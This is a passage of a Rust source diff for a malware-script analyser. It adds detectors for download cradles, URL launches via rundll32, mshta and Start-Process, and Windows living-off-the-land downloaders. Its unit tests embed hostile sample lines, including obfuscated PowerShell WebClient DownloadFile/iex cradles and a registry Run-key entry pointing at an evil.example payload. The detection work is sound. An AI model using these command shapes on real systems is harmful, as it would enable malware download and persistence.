+        Regex::new(r#"(?is)\bfrom\s+urllib\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#)
+            .expect("python urllib request module import regex")
+    });
+
+    let mut aliases = vec!["urllib.request".to_string()];
+    aliases.extend(
+        PY_IMPORT_URLLIB_REQUEST_ALIAS_RE
+            .captures_iter(text)
+            .take(8)
+            .filter_map(|caps| caps.get(1).map(|m| m.as_str().to_string())),
+    );
+    for caps in PY_FROM_URLLIB_REQUEST_MODULE_IMPORT_RE
+        .captures_iter(text)
+        .take(8)
+    {
+        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
+            continue;
+        };
+        for part in imports.split(',') {
+            let part = part.trim().trim_matches(['(', ')']);
+            let words: Vec<&str> = part.split_ascii_whitespace().collect();
+            if words.first().copied() != Some("request") {
+                continue;
+            }
+            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
+                words.get(2).copied().unwrap_or("request")
+            } else {
+                "request"
+            };
+            if is_python_identifier(alias) {
+                aliases.push(alias.to_string());
+            }
+        }
+    }
+    aliases
+}
+
+fn collect_python_urllib_assigned_call_aliases(text: &str, target_method: &str) -> Vec<String> {
+    if !text.as_bytes().contains(&b'=')
+        || !contains_ascii_case_insensitive_atom(text, target_method.as_bytes())
+    {
+        return Vec::new();
+    }
+
+    #[allow(clippy::expect_used)]
+    static PY_URLLIB_METHOD_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*(?:\.request)?)\.(urlopen|urlretrieve)\b"#,
+        )
+        .expect("python urllib method assignment regex")
+    });
+
+    let modules = collect_python_urllib_request_module_aliases(text);
+    PY_URLLIB_METHOD_ASSIGN_RE
+        .captures_iter(text)
+        .take(8)
+        .filter_map(|caps| {
+            let alias = caps.get(1)?.as_str();
+            let module = caps.get(2)?.as_str();
+            let method = caps.get(3)?.as_str();
+            if method == target_method && modules.iter().any(|known| known == module) {
+                Some(alias.to_string())
+            } else {
+                None
+            }
+        })
+        .collect()
 }
 
 fn find_dotted_method_url_literals(text: &str) -> Vec<(String, String)> {
@@ -709,7 +2449,236 @@ fn find_matching_paren(text: &str, open: usize) -> Option<usize> {
 }
 
 fn first_url_literal(args: &str) -> Option<String> {
+    if let Some(literal) = python_adjacent_string_literal_expr(args) {
+        let trimmed = trim_url_suffix(&literal);
+        if looks_like_direct_url(trimmed) {
+            return Some(trimmed.to_string());
+        }
+    }
+    python_quoted_literals(args)
+        .into_iter()
+        .find_map(|literal| {
+            looks_like_direct_url(trim_url_suffix(&literal))
+                .then(|| trim_url_suffix(&literal).to_string())
+        })
+}
+
+fn first_python_url_arg(args: &str, bindings: &HashMap<String, String>) -> Option<String> {
+    let parts = split_python_top_level_args(args);
+    python_keyword_url_arg(&parts, "url", bindings).or_else(|| {
+        parts
+            .into_iter()
+            .take(4)
+            .find(|arg| !python_arg_has_keyword(arg))
+            .and_then(|arg| python_url_arg_expr(arg, bindings))
+    })
+}
+
+fn python_keyword_url_arg(
+    parts: &[&str],
+    keyword: &str,
+    bindings: &HashMap<String, String>,
+) -> Option<String> {
+    parts.iter().find_map(|part| {
+        let (key, value) = part.split_once('=')?;
+        key.trim()
+            .eq_ignore_ascii_case(keyword)
+            .then(|| python_url_arg_expr(value, bindings))?
+    })
+}
+
+fn python_url_arg_expr(arg: &str, bindings: &HashMap<String, String>) -> Option<String> {
+    python_inline_urllib_request_url_arg(arg, bindings)
+        .or_else(|| first_url_literal(arg))
+        .or_else(|| python_url_arg_from_binding(arg, bindings))
+}
+
+fn python_inline_urllib_request_url_arg(
+    arg: &str,
+    bindings: &HashMap<String, String>,
+) -> Option<String> {
+    let expr = arg.trim();
+    for name in ["urllib.request.Request", "urllib.Request", "Request"] {
+        if !expr
+            .get(..name.len())
+            .is_some_and(|prefix| prefix.eq_ignore_ascii_case(name))
+        {
+            continue;
+        }
+        if !is_callable_name_boundary(expr, 0, name.len()) {
+            continue;
+        }
+        let open = skip_ascii_ws(expr, name.len());
+        if expr.as_bytes().get(open) != Some(&b'(') {
+            continue;
+        }
+        let close = find_matching_paren(expr, open)?;
+        if skip_ascii_ws(expr, close + 1) != expr.len() {
+            continue;
+        }
+        return first_python_url_arg(&expr[open + 1..close], bindings);
+    }
+    None
+}
+
+fn python_url_arg_from_binding(arg: &str, bindings: &HashMap<String, String>) -> Option<String> {
+    let expr = if let Some((key, value)) = arg.split_once('=') {
+        if is_python_identifier(key.trim()) {
+            value
+        } else {
+            arg
+        }
+    } else {
+        arg
+    };
+    let expr = expr.trim();
+    let (ident, ident_end) = parse_ascii_ident(expr, 0)?;
+    if skip_ascii_ws(expr, ident_end) != expr.len() {
+        return None;
+    }
+    bindings.get(&ident).cloned()
+}
+
+fn split_python_top_level_args(args: &str) -> Vec<&str> {
     let bytes = args.as_bytes();
+    let mut parts = Vec::new();
+    let mut start = 0usize;
+    let mut depth = 0usize;
+    let mut quote: Option<u8> = None;
+    let mut i = 0usize;
+    while i < bytes.len() {
+        if let Some(q) = quote {
+            if bytes[i] == b'\\' {
+                i = i.saturating_add(2);
+                continue;
+            }
+            if bytes[i] == q {
+                quote = None;
+            }
+            i += 1;
+            continue;
+        }
+        match bytes[i] {
+            b'\'' | b'"' => quote = Some(bytes[i]),
+            b'(' | b'[' | b'{' => depth = depth.saturating_add(1),
+            b')' | b']' | b'}' => depth = depth.saturating_sub(1),
+            b',' if depth == 0 => {
+                parts.push(args[start..i].trim());
+                start = i + 1;
+            }
+            _ => {}
+        }
+        i += 1;
+    }
+    if start <= args.len() {
+        parts.push(args[start..].trim());
+    }
+    parts
+}
+
+fn collect_python_url_string_bindings_from(
+    bindings: &HashMap<String, String>,
+) -> HashMap<String, String> {
+    bindings
+        .iter()
+        .filter_map(|(name, value)| {
+            let url = normalize_liberal_url_token(trim_url_suffix(value))?;
+            Some((name.clone(), url))
+        })
+        .collect()
+}
+
+fn collect_python_string_bindings(text: &str) -> HashMap<String, String> {
+    #[allow(clippy::expect_used)]
+    static PY_STRING_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:'([^']{1,2048})'|"([^"]{1,2048})")"#,
+        )
+        .expect("python string assignment regex")
+    });
+    #[allow(clippy::expect_used)]
+    static PY_STRING_ASSIGN_EXPR_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)(?:^|[;\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^;\r\n]{1,4096})"#)
+            .expect("python string assignment expr regex")
+    });
+
+    let mut bindings: HashMap<String, String> = PY_STRING_ASSIGN_RE
+        .captures_iter(text)
+        .take(64)
+        .filter_map(|caps| {
+            let name = caps.get(1)?.as_str();
+            let value = caps.get(2).or_else(|| caps.get(3))?.as_str();
+            Some((name.to_string(), value.to_string()))
+        })
+        .collect();
+
+    for caps in PY_STRING_ASSIGN_EXPR_RE.captures_iter(text).take(64) {
+        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(expr) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(value) = python_adjacent_string_literal_expr(expr) else {
+            continue;
+        };
+        bindings.insert(name.to_string(), value);
+    }
+    bindings
+}
+
+fn python_adjacent_string_literal_expr(expr: &str) -> Option<String> {
+    let expr = expr.trim();
+    if expr.is_empty() {
+        return None;
+    }
+    let mut out = String::new();
+    let mut count = 0usize;
+    let mut cursor = 0usize;
+    while cursor < expr.len() {
+        cursor = skip_ascii_ws(expr, cursor);
+        if cursor == expr.len() {
+            break;
+        }
+        let (end, literal) = parse_python_quoted_literal_at(expr, cursor)?;
+        out.push_str(&literal);
+        count += 1;
+        cursor = end;
+    }
+    (count > 0).then_some(out)
+}
+
+fn parse_python_quoted_literal_at(expr: &str, start: usize) -> Option<(usize, String)> {
+    let bytes = expr.as_bytes();
+    let quote = *bytes.get(start)?;
+    if quote != b'\'' && quote != b'"' {
+        return None;
+    }
+    let mut literal = String::new();
+    let mut i = start + 1;
+    while i < bytes.len() {
+        let byte = bytes[i];
+        if byte == b'\\' {
+            let Some(next) = bytes.get(i + 1) else {
+                literal.push('\\');
+                return Some((bytes.len(), literal));
+            };
+            literal.push(*next as char);
+            i += 2;
+            continue;
+        }
+        if byte == quote {
+            return Some((i + 1, literal));
+        }
+        literal.push(byte as char);
+        i += 1;
+    }
+    None
+}
+
+fn python_quoted_literals(args: &str) -> Vec<String> {
+    let bytes = args.as_bytes();
+    let mut literals = Vec::new();
     let mut i = 0;
     while i < bytes.len() {
         let mut quote = bytes[i];
@@ -743,12 +2712,10 @@ fn first_url_literal(args: &str) -> Option<String> {
             literal.push(byte as char);
             i += 1;
         }
-        if looks_like_direct_url(trim_url_suffix(&literal)) {
-            return Some(trim_url_suffix(&literal).to_string());
-        }
+        literals.push(literal);
         i += 1;
     }
-    None
+    literals
 }
 
 fn has_short_webclient_context(text: &str, dot: usize) -> bool {
@@ -795,6 +2762,30 @@ fn typo_method_distance_limit(method: &str) -> usize {
     }
 }
 
+#[cfg(test)]
+mod typo_webclient_prefilter_tests {
+    use super::has_typo_webclient_download_atom;
+
+    #[test]
+    fn prefilter_allows_known_typo_webclient_shapes() {
+        for text in [
+            "powershell (New-Ojec Sstem.Net.WebCliet).DownloadFle('https://drop.example/a')",
+            "powershll (Nw-ject Sstem.Net.Welint).Dwnloadile('https://raw.example/b')",
+            "set x=iex(\"w-ject t.bient).wnloadring('http://172.104.150.66/p')\")",
+            "eh (Ne-bet -peme tem.et.ebCet).de('http://tvde.m/e/pt.zp')",
+        ] {
+            assert!(has_typo_webclient_download_atom(text), "blocked: {text}");
+        }
+    }
+
+    #[test]
+    fn prefilter_blocks_text_without_webclient_download_atoms() {
+        assert!(!has_typo_webclient_download_atom(
+            "set a.b.c=1\r\necho https://docs.example/reference\r\nfor %i in (a.b.c) do echo %i"
+        ));
+    }
+}
+
 fn edit_distance_at_most(left: &str, right: &str, max_distance: usize) -> bool {
     if left.len().abs_diff(right.len()) > max_distance {
         return false;
@@ -822,6 +2813,10 @@ fn edit_distance_at_most(left: &str, right: &str, max_distance: usize) -> bool {
 }
 
 fn scan_url_launch_deob_text(deobfuscated: &str, env: &mut Environment) {
+    if !has_url_launch_atom(deobfuscated) {
+        return;
+    }
+
     let mut known: std::collections::HashSet<String> = env
         .traits
         .iter()
@@ -837,6 +2832,9 @@ fn scan_url_launch_deob_text(deobfuscated: &str, env: &mut Environment) {
         .collect();
 
     for line in deobfuscated.lines() {
+        if !has_url_launch_line_atom(line) {
+            continue;
+        }
         let tokens = split_words(line);
         if tokens.is_empty() {
             continue;
@@ -846,8 +2844,10 @@ fn scan_url_launch_deob_text(deobfuscated: &str, env: &mut Environment) {
             let cmd = command_name(strip_quotes(&tokens[i]));
             let Some(url) = (if cmd == "start" || cmd == "start.exe" {
                 url_launch_after_start(&tokens, i + 1)
+            } else if cmd == "rundll32" || cmd == "rundll32.exe" {
+                url_launch_after_rundll32(&tokens, i + 1)
             } else if is_url_launcher_command(&cmd) {
-                first_url_after(&tokens, i + 1)
+                first_url_after(&tokens, i + 1, false, true)
             } else {
                 None
             }) else {
@@ -862,10 +2862,521 @@ fn scan_url_launch_deob_text(deobfuscated: &str, env: &mut Environment) {
                 url,
             });
         }
+
+        for url in powershell_url_launches_in_line(line) {
+            if is_noise_url(&url) || !known.insert(url.clone()) {
+                continue;
+            }
+            env.traits.push(Trait::UrlLaunch {
+                cmd: line.to_string(),
+                url,
+            });
+        }
     }
 }
 
+fn has_url_launch_atom(text: &str) -> bool {
+    let has_urlish = [
+        b"http:".as_slice(),
+        b"https:".as_slice(),
+        b"file:".as_slice(),
+    ]
+    .iter()
+    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
+        || (text.contains('/') && text.contains('.'));
+    if !has_urlish {
+        return false;
+    }
+    [
+        b"start".as_slice(),
+        b"explorer".as_slice(),
+        b"rundll32".as_slice(),
+        b"fileprotocolhandler".as_slice(),
+        b"openurl".as_slice(),
+        b"imageview_fullscreen".as_slice(),
+        b"start-process".as_slice(),
+        b"saps".as_slice(),
+        b"invoke-item".as_slice(),
+        b"ii ".as_slice(),
+        b"msedge".as_slice(),
+        b"chrome".as_slice(),
+        b"firefox".as_slice(),
+        b"brave".as_slice(),
+        b"opera".as_slice(),
+        b"iexplore".as_slice(),
+        b"hh".as_slice(),
+    ]
+    .iter()
+    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
+}
+
+fn has_url_launch_line_atom(line: &str) -> bool {
+    if !has_url_launch_atom(line) {
+        return false;
+    }
+    let trimmed = line.trim_start_matches(['@', ' ', '\t', '(']);
+    let first = trimmed
+        .split_ascii_whitespace()
+        .next()
+        .unwrap_or("")
+        .trim_matches('"')
+        .to_ascii_lowercase();
+    !matches!(first.as_str(), "set" | "setx" | "echo" | "rem" | "::")
+}
+
+#[cfg(test)]
+mod url_launch_prefilter_tests {
+    use super::{has_url_launch_atom, has_url_launch_line_atom};
+
+    #[test]
+    fn prefilter_allows_supported_url_launch_shapes() {
+        assert!(has_url_launch_atom(
+            r#"start "" "https://lure.example/a.pdf""#
+        ));
+        assert!(has_url_launch_atom(
+            "explorer.exe portal-schemeless.example/privacy/"
+        ));
+        assert!(has_url_launch_atom(
+            "rundll32.exe url.dll,FileProtocolHandler https://launch.example/a"
+        ));
+        assert!(has_url_launch_atom(
+            "powershell -Command \"Start-Process -FilePath:pslaunch.example/e.pdf\""
+        ));
+        assert!(has_url_launch_atom("hh.exe https://hh.example/help.chm"));
+    }
+
+    #[test]
+    fn prefilter_blocks_unrelated_url_text() {
+        assert!(!has_url_launch_atom("echo https://plain.example/payload"));
+        assert!(!has_url_launch_line_atom(
+            "set browser=chrome.exe && set url=plain.example/payload"
+        ));
+    }
+}
+
+fn powershell_url_launches_in_line(line: &str) -> Vec<String> {
+    let mut found = Vec::new();
+    for name in ["Start-Process", "saps", "Invoke-Item", "ii"] {
+        let mut search_start = 0;
+        while let Some(name_start) = find_ascii_case_insensitive(line, name, search_start) {
+            let name_end = name_start + name.len();
+            if !is_callable_name_boundary(line, name_start, name_end) {
+                search_start = name_end;
+                continue;
+            }
+            let tokens = split_words(&line[name_start..]);
+            if tokens
+                .first()
+                .map(|token| is_url_launcher_command(&command_name(strip_quotes(token))))
+                .unwrap_or(false)
+            {
+                if let Some(url) = first_url_after(&tokens, 1, false, true) {
+                    found.push(url);
+                }
+            }
+            search_start = name_end;
+        }
+    }
+    found
+}
+
+fn url_launch_after_rundll32(tokens: &[String], start: usize) -> Option<String> {
+    let handler_idx = (start..tokens.len())
+        .take(4)
+        .find(|idx| rundll32_url_launch_export(strip_quotes(&tokens[*idx])))?;
+    first_url_after(tokens, handler_idx + 1, false, true)
+}
+
+fn rundll32_url_launch_export(token: &str) -> bool {
+    let lower = token.to_ascii_lowercase();
+    lower.contains("url.dll,fileprotocolhandler")
+        || lower.contains("url.dll,openurl")
+        || lower.contains("ieframe.dll,openurl")
+        || lower.contains("shdocvw.dll,openurl")
+        || lower.contains("photoviewer.dll,imageview_fullscreen")
+        || lower.contains("shimgvw.dll,imageview_fullscreen")
+}
+
+fn rundll32_download_export(token: &str) -> bool {
+    token
+        .to_ascii_lowercase()
+        .contains("scrobj.dll,generatetypelib")
+}
+
+fn scan_rundll32_download_exports_deob_text(deobfuscated: &str, env: &mut Environment) {
+    if !has_rundll32_download_export_atom(deobfuscated) {
+        return;
+    }
+    let downloads = download_urls_by_destination(env);
+    let mut known_source_cmds: std::collections::HashSet<(String, String)> = env
+        .traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::UrlArgument { cmd, url } => Some((cmd.clone(), url.clone())),
+            _ => None,
+        })
+        .collect();
+    let mut known: std::collections::HashSet<String> = env
+        .traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::Download { src, .. } => Some(src.clone()),
+            Trait::UrlLaunch { url, .. } => Some(url.clone()),
+            Trait::UrlArgument { url, .. } => Some(url.clone()),
+            Trait::CertutilDownload { url, .. } => Some(url.clone()),
+            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
+            _ => None,
+        })
+        .collect();
+
+    for line in deobfuscated.lines() {
+        let tokens = split_words(line);
+        for i in 0..tokens.len() {
+            let cmd = command_name(strip_quotes(&tokens[i]));
+            if cmd != "rundll32" && cmd != "rundll32.exe" {
+                continue;
+            }
+            let Some(export_idx) = (i + 1..tokens.len())
+                .take(4)
+                .find(|idx| rundll32_download_export(strip_quotes(&tokens[*idx])))
+            else {
+                continue;
+            };
+            if let Some(url) = first_url_after(&tokens, export_idx + 1, false, true) {
+                if is_noise_url(&url) || !known.insert(url.clone()) {
+                    continue;
+                }
+                env.traits.push(Trait::Download {
+                    cmd: line.to_string(),
+                    src: url,
+                    dst: None,
+                });
+                continue;
+            }
+            let Some(url) = rundll32_download_export_prior_download_url_after(
+                &tokens,
+                export_idx + 1,
+                &downloads,
+            ) else {
+                continue;
+            };
+            if is_noise_url(&url) || !known_source_cmds.insert((line.to_string(), url.clone())) {
+                continue;
+            }
+            env.traits.push(Trait::UrlArgument {
+                cmd: line.to_string(),
+                url,
+            });
+        }
+    }
+}
+
+fn rundll32_download_export_prior_download_url_after(
+    tokens: &[String],
+    start: usize,
+    downloads: &std::collections::HashMap<String, String>,
+) -> Option<String> {
+    for token in tokens.iter().skip(start).take(4) {
+        let candidate = trim_url_suffix(strip_quotes(token)).trim();
+        if candidate.is_empty() || candidate.starts_with(['/', '-']) {
+            continue;
+        }
+        if let Some(url) = url_for_download_destination(candidate, downloads) {
+            return Some(url);
+        }
+    }
+    None
+}
+
+fn scan_glued_rundll32_deob_text(deobfuscated: &str, env: &mut Environment) {
+    if !contains_ascii_case_insensitive_atom(deobfuscated, b"rundll32") {
+        return;
+    }
+    let downloads = download_urls_by_destination(env);
+    let mut known_cmds: std::collections::HashSet<String> = env
+        .traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::Rundll32 { cmd, .. } => Some(cmd.clone()),
+            _ => None,
+        })
+        .collect();
+
+    for line in deobfuscated.lines() {
+        if !contains_ascii_case_insensitive_atom(line, b"rundll32") {
+            continue;
+        }
+        for caps in GLUED_RUNDLL32_RE.captures_iter(line) {
+            let Some(cmd_match) = caps.get(1) else {
+                continue;
+            };
+            let Some(dll_match) = caps.get(2) else {
+                continue;
+            };
+            if dll_match.as_str().to_ascii_lowercase().starts_with(".exe") {
+                continue;
+            }
+            let cmd = cmd_match.as_str().trim().to_string();
+            if !known_cmds.insert(cmd.clone()) {
+                continue;
+            }
+            let dll = strip_quotes(dll_match.as_str());
+            let url = url_for_download_destination(dll, &downloads);
+            env.traits.push(Trait::Rundll32 { cmd, url });
+        }
+        for caps in SPACED_RUNDLL32_RE.captures_iter(line) {
+            let Some(cmd_match) = caps.get(1) else {
+                continue;
+            };
+            let dll = caps
+                .get(2)
+                .or_else(|| caps.get(3))
+                .map(|m| strip_quotes(m.as_str()))
+                .unwrap_or("");
+            let Some(url) = url_for_download_destination(dll, &downloads) else {
+                continue;
+            };
+            let cmd = cmd_match.as_str().trim().to_string();
+            if !known_cmds.insert(cmd.clone()) {
+                continue;
+            }
+            env.traits.push(Trait::Rundll32 {
+                cmd,
+                url: Some(url),
+            });
+        }
+    }
+}
+
+fn scan_mshta_local_deob_text(deobfuscated: &str, env: &mut Environment) {
+    if !contains_ascii_case_insensitive_atom(deobfuscated, b"mshta") {
+        return;
+    }
+    let downloads = download_urls_by_destination(env);
+    if downloads.is_empty() {
+        return;
+    }
+    let mut known: std::collections::HashSet<(String, String)> = env
+        .traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::UrlArgument { cmd, url } => Some((cmd.clone(), url.clone())),
+            _ => None,
+        })
+        .collect();
+
+    for line in deobfuscated.lines() {
+        if !contains_ascii_case_insensitive_atom(line, b"mshta") {
+            continue;
+        }
+        let tokens = split_words(line);
+        for i in 0..tokens.len() {
+            let cmd = command_name(strip_quotes(&tokens[i]));
+            if cmd != "mshta" && cmd != "mshta.exe" {
+                continue;
+            }
+            let Some(url) = mshta_prior_download_url_after(&tokens, i + 1, &downloads) else {
+                continue;
+            };
+            if is_noise_url(&url) || !known.insert((line.to_string(), url.clone())) {
+                continue;
+            }
+            env.traits.push(Trait::UrlArgument {
+                cmd: line.to_string(),
+                url,
+            });
+        }
+    }
+}
+
+fn mshta_prior_download_url_after(
+    tokens: &[String],
+    start: usize,
+    downloads: &std::collections::HashMap<String, String>,
+) -> Option<String> {
+    for token in tokens.iter().skip(start).take(8) {
+        let candidate = trim_url_suffix(strip_quotes(token)).trim();
+        if candidate.is_empty() || candidate.starts_with(['/', '-']) {
+            continue;
+        }
+        if !is_hta_target(candidate) {
+            continue;
+        }
+        if let Some(url) = url_for_download_destination(candidate, downloads) {
+            return Some(url);
+        }
+    }
+    None
+}
+
+fn is_hta_target(candidate: &str) -> bool {
+    let lower = trim_url_suffix(candidate).to_ascii_lowercase();
+    [".hta", ".htm", ".html"]
+        .iter()
+        .any(|suffix| lower.ends_with(suffix))
+}
+
+fn download_urls_by_destination(env: &Environment) -> std::collections::HashMap<String, String> {
+    let mut out = std::collections::HashMap::new();
+    for t in &env.traits {
+        let (src, dst) = match t {
+            Trait::Download {
+                src,
+                dst: Some(dst),
+                ..
+            } => (src, dst),
+            Trait::CertutilDownload { url, dst } | Trait::BitsadminDownload { url, dst } => {
+                (url, dst)
+            }
+            _ => continue,
+        };
+        let key = normalized_path_key(dst);
+        if !key.is_empty() {
+            out.entry(key).or_insert_with(|| src.clone());
+        }
+        let basename = normalized_path_basename(dst);
+        if !basename.is_empty() {
+            out.entry(basename).or_insert_with(|| src.clone());
+        }
+    }
+    out
+}
+
+fn url_for_download_destination(
+    dll: &str,
+    downloads: &std::collections::HashMap<String, String>,
+) -> Option<String> {
+    let key = normalized_path_key(dll);
+    downloads
+        .get(&key)
+        .cloned()
+        .or_else(|| downloads.get(&normalized_path_basename(dll)).cloned())
+}
+
+fn normalized_path_key(path: &str) -> String {
+    strip_quotes(path)
+        .trim()
+        .trim_start_matches(".\\")
+        .replace('/', "\\")
+        .to_ascii_lowercase()
+}
+
+fn normalized_path_basename(path: &str) -> String {
+    normalized_path_key(path)
+        .rsplit('\\')
+        .next()
+        .unwrap_or("")
+        .to_string()
+}
+
+fn scan_desktopimgdownldr_deob_text(deobfuscated: &str, env: &mut Environment) {
+    if !has_desktopimgdownldr_atom(deobfuscated) {
+        return;
+    }
+    let mut known: std::collections::HashSet<String> = env
+        .traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::Download { src, .. } => Some(src.clone()),
+            Trait::UrlArgument { url, .. } => Some(url.clone()),
+            Trait::UrlLaunch { url, .. } => Some(url.clone()),
+            Trait::CertutilDownload { url, .. } => Some(url.clone()),
+            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
+            _ => None,
+        })
+        .collect();
+
+    for line in deobfuscated.lines() {
+        let tokens = split_words(line);
+        for i in 0..tokens.len() {
+            let cmd = command_name(strip_quotes(&tokens[i]));
+            if cmd != "desktopimgdownldr" && cmd != "desktopimgdownldr.exe" {
+                continue;
+            }
+            let Some(url) = desktopimgdownldr_lockscreen_url_after(&tokens, i + 1) else {
+                continue;
+            };
+            if is_noise_url(&url) || !known.insert(url.clone()) {
+                continue;
+            }
+            push_lolbas_once(env, "desktopimgdownldr", line);
+            env.traits.push(Trait::Download {
+                cmd: line.to_string(),
+                src: url,
+                dst: None,
+            });
+        }
+    }
+}
+
+fn scan_certoc_deob_text(deobfuscated: &str, env: &mut Environment) {
+    if !has_certoc_getcacaps_atom(deobfuscated) {
+        return;
+    }
+    let mut known: std::collections::HashSet<String> = env
+        .traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::Download { src, .. } => Some(src.clone()),
+            Trait::UrlArgument { url, .. } => Some(url.clone()),
+            Trait::UrlLaunch { url, .. } => Some(url.clone()),
+            Trait::CertutilDownload { url, .. } => Some(url.clone()),
+            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
+            _ => None,
+        })
+        .collect();
+
+    for line in deobfuscated.lines() {
+        let tokens = split_words(line);
+        for i in 0..tokens.len() {
+            let cmd = command_name(strip_quotes(&tokens[i]));
+            if cmd != "certoc" && cmd != "certoc.exe" {
+                continue;
+            }
+            let Some(url) = certoc_getcacaps_url_after(&tokens, i + 1) else {
+                continue;
+            };
+            if is_noise_url(&url) || !known.insert(url.clone()) {
+                continue;
+            }
+            push_lolbas_once(env, "certoc", line);
+            env.traits.push(Trait::Download {
+                cmd: line.to_string(),
+                src: url,
+                dst: None,
+            });
+        }
+    }
+}
+
+fn has_rundll32_download_export_atom(text: &str) -> bool {
+    contains_ascii_case_insensitive_atom(text, b"rundll32")
+        && contains_ascii_case_insensitive_atom(text, b"scrobj.dll")
+        && contains_ascii_case_insensitive_atom(text, b"generatetypelib")
+}
+
+fn has_desktopimgdownldr_atom(text: &str) -> bool {
+    contains_ascii_case_insensitive_atom(text, b"desktopimgdownldr")
+        && contains_ascii_case_insensitive_atom(text, b"lockscreenurl")
+}
+
+fn has_certoc_getcacaps_atom(text: &str) -> bool {
+    contains_ascii_case_insensitive_atom(text, b"certoc")
+        && contains_ascii_case_insensitive_atom(text, b"getcacaps")
+}
+
+fn certoc_getcacaps_url_after(tokens: &[String], start: usize) -> Option<String> {
+    flag_url_value_after(tokens, start, &["-getcacaps", "/getcacaps"])
+}
+
+fn desktopimgdownldr_lockscreen_url_after(tokens: &[String], start: usize) -> Option<String> {
+    flag_url_value_after(tokens, start, &["/lockscreenurl", "-lockscreenurl"])
+}
+
 fn scan_url_variable_assignments(deobfuscated: &str, env: &mut Environment) {
+    if !has_url_variable_assignment_atom(deobfuscated) {
+        return;
+    }
     let mut known: std::collections::HashSet<String> = env
         .traits
         .iter()
@@ -881,7 +3392,19 @@ fn scan_url_variable_assignments(deobfuscated: &str, env: &mut Environment) {
         .collect();
 
     for line in deobfuscated.lines() {
+        if !has_url_variable_assignment_atom(line) {
+            continue;
+        }
         for caps in CMD_URL_VAR_RE.captures_iter(line) {
+            emit_url_variable(
+                caps.get(1).map(|m| m.as_str()),
+                caps.get(2).map(|m| m.as_str()),
+                line,
+                env,
+                &mut known,
+            );
+        }
+        for caps in CMD_SCHEMELESS_URL_VAR_RE.captures_iter(line) {
             emit_url_variable(
                 caps.get(1).map(|m| m.as_str()),
                 caps.get(2).map(|m| m.as_str()),
@@ -899,10 +3422,72 @@ fn scan_url_variable_assignments(deobfuscated: &str, env: &mut Environment) {
                 &mut known,
             );
         }
+        for caps in PS_SCHEMELESS_URL_VAR_RE.captures_iter(line) {
+            emit_url_variable(
+                caps.get(1).map(|m| m.as_str()),
+                caps.get(2).map(|m| m.as_str()),
+                line,
+                env,
+                &mut known,
+            );
+        }
+    }
+}
+
+fn has_url_variable_assignment_atom(text: &str) -> bool {
+    if !text.as_bytes().contains(&b'=') {
+        return false;
+    }
+    if [
+        b"http:".as_slice(),
+        b"https:".as_slice(),
+        b"ftp:".as_slice(),
+        b"file:".as_slice(),
+    ]
+    .iter()
+    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
+    {
+        return true;
+    }
+    contains_ascii_case_insensitive_atom(text, b"url") && text.contains('/') && text.contains('.')
+}
+
+#[cfg(test)]
+mod url_variable_assignment_prefilter_tests {
+    use super::has_url_variable_assignment_atom;
+
+    #[test]
+    fn prefilter_allows_cmd_and_powershell_url_assignments() {
+        assert!(has_url_variable_assignment_atom(
+            r#"set "u=https://evil.example/p""#
+        ));
+        assert!(has_url_variable_assignment_atom(
+            r#"$u = 'ftp://evil.example/p'"#
+        ));
+        assert!(has_url_variable_assignment_atom(
+            r#"set payloadUrl=evil.example/payload.exe"#
+        ));
+        assert!(has_url_variable_assignment_atom(
+            r#"$payloadUrl = "evil.example/payload.exe""#
+        ));
+    }
+
+    #[test]
+    fn prefilter_blocks_generic_url_words_without_assignment() {
+        assert!(!has_url_variable_assignment_atom(
+            "echo https://evil.example/p"
+        ));
+        assert!(!has_url_variable_assignment_atom(
+            "set name=not-a-url && echo url"
+        ));
     }
 }
 
 fn scan_registry_url_values(deobfuscated: &str, env: &mut Environment) {
+    if !has_registry_url_values_atom(deobfuscated) {
+        return;
+    }
+
     let mut known: std::collections::HashSet<String> = env
         .traits
         .iter()
@@ -940,9 +3525,16 @@ fn scan_registry_url_values(deobfuscated: &str, env: &mut Environment) {
                 i += 2;
                 continue;
             }
+            if token.eq_ignore_ascii_case("/ve") {
+                value_name = Some("(Default)".to_string());
+                i += 1;
+                continue;
+            }
             if token.eq_ignore_ascii_case("/d") {
                 url = tokens.get(i + 1).and_then(|next| {
-                    normalize_liberal_url_token(trim_url_suffix(strip_quotes(next)))
+                    let value = trim_url_suffix(strip_quotes(next));
+                    normalize_liberal_url_token(value)
+                        .or_else(|| normalize_schemeless_domain_path_token(value))
                 });
                 i += 2;
                 continue;
@@ -963,6 +3555,33 @@ fn scan_registry_url_values(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
+fn has_registry_url_values_atom(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    lower.contains("reg") && lower.contains("/d")
+}
+
+#[cfg(test)]
+mod registry_url_values_prefilter_tests {
+    use super::has_registry_url_values_atom;
+
+    #[test]
+    fn prefilter_allows_reg_url_value_shapes() {
+        assert!(has_registry_url_values_atom(
+            r#"reg add HKCU\Software\Run /v Updater /d https://evil.example/a.exe"#
+        ));
+    }
+
+    #[test]
